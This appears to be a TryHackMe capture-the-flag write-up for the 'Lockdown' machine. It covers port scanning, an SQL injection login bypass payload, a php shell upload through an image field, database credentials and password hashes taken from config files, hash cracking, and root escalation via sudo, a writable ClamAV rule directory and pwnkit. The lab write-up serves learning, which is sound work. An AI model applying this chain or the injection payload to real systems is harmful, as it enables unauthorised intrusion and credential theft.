# Introduction

we first add a domain in /etc/hosts so we don't need to remember the IP
```bash
10.10.xx.xx lockdown.thm
```

# Enumeration

we do a nmap with some options :\
\
-T4 is for have more threads to accelerate the scan\
-p- is to scan all the ports\
-sV is to scan the version\
\
we run the scan as sudo so it's doing a SYN scan and not a full TCP connection so it's faster

```bash
sudo nmap -T4 -p- -sV lockdown.thm
```

we got these open ports
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# HTTP (port 80)
Sql injection in admin form 
```
admin' OR 1=1;#
```


in system info we can change the image displayed to users and upload a php shell


array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
private $host = 'localhost';
    private $username = 'cts';
    private $password = 'YOUMKtIXoRjFgMqDJ3WR799tvq2UdNWE';
    private $database = 'cts_db';



we can found the admin password in database : 3eba6f73c19818c36ba8fea761a3ce6d
careful, if we modify the admin password then the password is blank and we don't have any more informations of the password hash

with john the hash give us : sweetpandemonium

we can use sudo to antivirus
the /var/lib/clamav is writable so we can create a custom yara rule to antivirus
```
rule test
{
  strings:
    $string = "root"
  condition:
    $string
}
```


we crack the hash of maxine : tiarna

by doing a sudo -l, we can execute any commands
so we execute sudo su -> we are now root

we can use pwnkit too for privilege escalation

